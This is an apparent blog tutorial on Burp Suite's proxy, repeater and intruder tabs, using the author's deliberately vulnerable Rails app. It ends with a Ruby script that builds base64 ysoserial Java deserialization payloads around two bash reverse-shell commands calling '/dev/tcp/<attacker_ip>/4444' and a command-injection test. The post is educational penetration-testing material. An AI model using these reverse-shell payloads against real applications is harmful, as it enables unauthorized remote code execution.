---
title: "A guide to Burp-suite"
date: 2020-07-20
slug: "guide-to-burp-suite"
description: "A guide to the Burp Suite - tips and tricks to get started with Burp and supplement it with scripts with an example using ysoserial"
keywords: ['burp suite', 'security', 'ruby', 'ysoserial']
draft: false
tags: []
math: false
toc: false
---

In this article I will discuss some of the features I most commonly use in the Burp Suite tool. I will also provide a sample of some of the Ruby scripts that I have written and used in conjunction with it.  

## What is Burp suite?

Portswigger, the creator of Burp Suite, describes the Community Edition of Burp Suite as a "feature-limited set of manual tools for exploring web security. Proxy your HTTPS traffic, edit and repeat requests, decode data, and more.".

Burp is commonly used by security researchers to perform manual and automated testing of web applications.  It is especially useful for manipulating HTTP requests and analyzing how an application responds.  

## Burp Proxy Basics

Burp functions as a web proxy, meaning that it will intercept any web traffic that is sent through a particular port.  By default, it will use port `8080`.  Before starting Burp or getting it set up, you will want to set up a proxy server on your web browser of choice.

I use a Firefox extension called [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) to manage my Burp proxy. You can also configure a web proxy manually through your browser settings.

An alternative to this approach would be to have two browsers running, one that you use to generate web traffic to the application you are analyzing, and another to conduct research.

You can also [generating a certificate for Burp to use](https://portswigger.net/support/installing-burp-suites-ca-certificate-in-your-browser) if you want to test a website that is not local to your environment.  

## Capturing Traffic

When you first launch Burp and navigate to your target application, you will likely see something like this under the `navigation` tab:

![image](https://user-images.githubusercontent.com/20469703/87994313-9f167b80-caba-11ea-81cd-817021da5ab2.png)

This is intercepting the traffic and allowing you to modify it and either forward it along (send it) or drop it (don't send it). You also have the option of `sending` this request to other Burp tabs using the `Action` button.

Typically, I will turn this feature off and use some of the other manual features such as the `HTTP history`, `Repeater`, or the `Target` tab to review network requests.

## The Request and Response tabs

The request and response tabs are present in most of the interfaces I will be covering.

The request tab, as its name implies, provides information about the request that was made to the server through the Burp Proxy.  

The `raw` view shows the raw request:
![image](https://user-images.githubusercontent.com/20469703/87995073-80b17f80-cabc-11ea-8acc-eb3089aee3d4.png)
And the `headers` view shows the headers from the request:
![image](https://user-images.githubusercontent.com/20469703/87995139-b0608780-cabc-11ea-8a91-9351cfcc011a.png)
The response tab will show what the server responded with:
![image](https://user-images.githubusercontent.com/20469703/87997479-2f58be80-cac3-11ea-9abe-76f0e92829d8.png)


## The Target Tab

Heading back to to the main navigation, you will see the `Target` tab.  The Target tab presents a hierarchical view of the site with the various pages available on the target application.  In this example, I am using a simple Rails API that has a `/library/books/<id>` RESTful API endpoint:

![image](https://user-images.githubusercontent.com/20469703/87994885-0ed93600-cabc-11ea-9f43-4aee9173b9a9.png)

As you can see above, it shows the routes of `library/books/1` and `library/books/2`.  This view is helpful for getting a general feel for how a website is structured.  I don't really tend to use this tab very often.

## The Proxy Tab

The Proxy tab is the area of Burp that I spend a lot of my time in when analyzing an application.

![image](https://user-images.githubusercontent.com/20469703/87995235-eef64200-cabc-11ea-8177-478eb49bf36b.png)

One of the most useful parts of this view is that you can compare various aspects of the responses and requests in the table view.  In the example above, you may notice that the response length and response status is different between the two requests.  

This is an example of why this tab is useful - it can allow you see if a particular request to the same endpoint results in a different response from the server.  In this particular example it is not significant, but in some cases this can be an initial clue pointing towards a potential vulnerability.

## The Repeater Tab

The Repeater tab is useful when you have discovered odd behavior in a target application and want to do a series of requests with slightly different content.  

![image](https://user-images.githubusercontent.com/20469703/87995581-e5210e80-cabd-11ea-9834-60d91235daa9.png)

You can modify any aspect of the HTTP request, including the header, HTTP action, User agent etc.  You can also *add* parameters or completely omit parameters from here.

![image](https://user-images.githubusercontent.com/20469703/87995969-ee5eab00-cabe-11ea-9951-ae604b55c0f9.png)

In this example, I have intentionally created a vulnerable application.  As you can see, sending `Logger` instead of an ID results in some unexpected behavior.  

The repeater tab is a bit easier than manually making browser requests.  It also does not appear in the Burp proxy history, so it can cut down on some of the noise when trying a bunch of different requests.

## The Intruder Tab

The intruder tab is used to send a large number of requests to a particular endpoint.  This can be a list that you type out manually or a `.txt` file that you've created specifically for that purpose.  I tend to only use the `sniper` option since I usually only test a single variant at a time.

To send a particular request to Intruder, you can use the following menu option from the proxy tab:

![image](https://user-images.githubusercontent.com/20469703/87996118-4b5a6100-cabf-11ea-8488-49789fcb3aca.png)

Once there, you can define which part of the request you'd like to make dynamic.  In this example, I am setting the `id` parameter of the URL as my payload marker:

![image](https://user-images.githubusercontent.com/20469703/87996232-865c9480-cabf-11ea-9c50-791cfea6fb09.png)

The next tab will be used to actually set the `Payloads` options.

![image](https://user-images.githubusercontent.com/20469703/87996308-c3288b80-cabf-11ea-9ff3-e76072cc4917.png)

You can paste in a list, load a list from a `.txt` file, or manually add terms here.
![image](https://user-images.githubusercontent.com/20469703/87996375-fa973800-cabf-11ea-930a-469e12bb3e80.png)

You can click the `Start Attack` button to run the attack. Once you run the attack, you can then observe the results:

![image](https://user-images.githubusercontent.com/20469703/87996410-100c6200-cac0-11ea-8eae-24b3bb662160.png)

In this example, any strings that are Rails objects that I pass in as arguments result in error code `500`, but other inputs tend to results in `200`, or `304`. This would further confirm some of the behavior I noticed when using the `Repeater` functionality earlier.

The intruder tab can be useful if you encounter an area of a web application that seems to respond differently to different types of input.  This can be useful for narrowing down what kind of potential vulnerability or unexpected behavior the server might be producing.

## Using scripts with Burp

One of the most powerful uses for Burp is using it alongside a scripting language of some kind.  Because Burp is a proxy, you can proxy a script's request through Burp just like you can with a browser request.

```ruby
require 'faraday'

url = "website"
conn = Faraday.new(url, ssl: {verify: false}) do |conn|
  conn.proxy = "http://localhost:8080"
end
response = conn.get
print response
```

This is a very simple example, but this code uses Ruby's Faraday gem to make a request through the Burp proxy.  This will allow requests generated from this script to to appear in the Burp proxy.  If I am writing a proof of concept exploit script, for example, this would allow me to observe the requests in Burp and compare them with requests that I have successfully made against the server.

## Generating Intruder Payloads with ysoserial and Ruby

Ysoserial is a powerful tool that is used to create gadget chains to exploit Deserialization vulnerabilities in Java.  Basically, this will create a string of some kind that contains malicious code that can result in `Remote Code Execution` or other exploit conditions within a Java application.  

While attempting to exploit a vulnerability in a Java application, I wrote the following script to generate a text file of ysoserial payloads encoded in base64.

In addition to the ysoserial payload, this also uses 3 different payloads for each of the payloads.  It also encodes the payloads in base64, which is commonly used by Java applications to receive a base64 encoded object.

```ruby
require 'base64'
cmd = "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"
cmd2 = "0<&196;exec 196<>/dev/tcp/<attacker_ip>/4444; sh <&196 >&196 2>&196"
cmd3 = 'touch HAAXXXED.txt'
payloads = %w(BeanShell1 C3P0 Clojure CommonsBeanutils1 CommonsCollections1
   CommonsCollections2 CommonsCollections3 CommonsCollections4
   CommonsCollections5 CommonsCollections6  FileUpload1 Groovy1 Hibernate1
   Hibernate2 FileUpload1 JBossInterceptors1 JRMPClient JRMPListener JSON1
   JavassistWeld1 Jdk7u21 Jython1 MozillaRhino1 Myfaces1 Myfaces2 ROME
   Spring1 Spring2 URLDNS Wicket1)
[cmd, cmd2, cmd3].each do |cmd|
  payloads.each do |payload|
    system("java -jar ysoserial.jar #{payload} \"#{cmd}\" >> temp_file.jar")
    content = File.open('temp_file.jar', 'rb')
    next unless content
    encoded_payload = Base64.strict_encode64(content)
    File.write("payloads.txt", encoded_payload, mode: "a")
    File.write("payloads.txt", "\n", mode: "a")
    `rm temp_file.jar`
  end
end
```

The three payloads tested 2 variations of a bash reverse shell that connects to a netcat listener, and one test for a command injection by seeing if I could create a file using the `touch` command.  I was able to use this to determine if the application was vulnerable to one of the given gadget chain command combinations.

In a similar way, intruder payloads can be generated using other tools to fuzz an application.  

## Burp

Burp is a fantastic tool to use for analyzing a web application for vulnerabilities.  You can also use scripts to enhance Burp's utility when analyzing a web application for vulnerabilities.  
